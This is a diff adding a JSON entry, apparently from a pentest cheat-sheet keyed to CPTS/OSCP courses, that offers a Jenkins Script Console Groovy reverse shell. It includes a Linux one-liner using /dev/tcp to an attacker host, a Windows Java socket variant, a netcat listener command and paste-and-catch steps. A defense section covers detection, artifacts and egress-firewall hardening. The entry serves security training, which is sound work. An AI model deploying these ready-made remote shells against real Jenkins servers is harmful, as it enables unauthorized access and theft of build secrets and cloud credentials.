@@ -1,0 +1,87 @@
+{
+  "type": "payload",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "jenkins"
+  ],
+  "tags": [
+    "jenkins",
+    "groovy",
+    "reverse-shell"
+  ],
+  "category": "Exploitation",
+  "subcategory": "Jenkins",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Catch the Groovy reverse shell on a listener",
+      "command": "nc -lvnp 8443"
+    }
+  ],
+  "notes": "Paste into the same /script console; the Linux one-liner uses /dev/tcp. On Windows use the ProcessBuilder/socket variant. Start the listener first.",
+  "references": [
+    {
+      "title": "Jenkins Security",
+      "url": "https://www.jenkins.io/security/"
+    },
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "jenkins-script-console-rce",
+      "note": "The console access this shell is pasted into.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "jenkins-groovy-revshell",
+  "name": "Jenkins - Groovy Reverse Shell",
+  "command": "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/<lhost>/<lport>;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()",
+  "description": "Groovy reverse shell for the Jenkins script console (Linux). A Windows ProcessBuilder variant exists for cmd.exe. Catch it with a netcat listener.",
+  "opsec": "loud",
+  "mitre": [
+    "T1190",
+    "T1059"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Jenkins' Script Console runs Groovy with full JVM access. Runtime.exec() spawns a bash process and redirects stdin/stdout to a TCP socket, creating an interactive reverse shell back to the attacker.",
+    "prerequisites": "Access to Jenkins Script Console. Outbound network connectivity from Jenkins server to attacker IP/port.",
+    "impact": "Fully interactive reverse shell as Jenkins process user. Access to all build artifacts, stored credentials (SSH keys, API tokens, cloud credentials), and any system reachable from Jenkins.",
+    "detection": "Unusual outbound TCP from Jenkins process to external IP. Jenkins process spawning bash/cmd child. EDR: reverse shell pattern from java process.",
+    "artifacts": "Network flow: Jenkins server -> attacker IP (reverse shell port) | Process tree: java -> bash -> /bin/bash -i | Jenkins Audit Trail (script execution)",
+    "prevention": "Strict egress firewall on Jenkins server -- deny all outbound except required build dependencies. Restrict Script Console access. Run Jenkins in a container with seccomp/AppArmor blocking raw socket creation.",
+    "misconfiguration": "Jenkins server has unrestricted outbound network access. Script Console accessible to admin users.",
+    "vulnerable_config": "# Jenkins -- Script Console accessible, no egress filter\n# /script endpoint enabled (default on all Jenkins installs)\n# iptables -- default ACCEPT policy (no egress filtering)\niptables -L OUTPUT  # policy ACCEPT -- all outbound allowed\n\n# Jenkins config.xml -- no script security plugin enforced\n<useSecurity>false</useSecurity>  <!-- or security realm with no permissions -->\n\n# Reverse shell possible because outbound TCP unrestricted",
+    "secure_config": "# Jenkins -- restrict Script Console access\n# /configureSecurity: Script Security Plugin enabled\n# Matrix-based security: only admin role gets Overall/Administer\n<authorizationStrategy class=\"hudson.security.ProjectMatrixAuthorizationStrategy\">\n  <permission>hudson.model.Hudson.Administer:admin</permission>\n</authorizationStrategy>\n\n# Egress firewall -- block outbound except approved destinations\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 0.0.0.0/0 -p tcp --dport 443 -j ACCEPT\niptables -A OUTPUT -d 0.0.0.0/0 -p tcp --dport 80  -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT",
+    "sources": [
+      "HTB M24",
+      "MITRE T1059.007",
+      "MITRE T1071.001"
+    ]
+  },
+  "variations": [
+    {
+      "label": "Windows Groovy reverse shell via Java Socket (Script Console)",
+      "command": "String host=\"<lhost>\";\nint port=<lport>;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Thread.sleep(50); try{p.exitValue();break;}catch(Exception e){} }\np.destroy();s.close();"
+    }
+  ]
+}
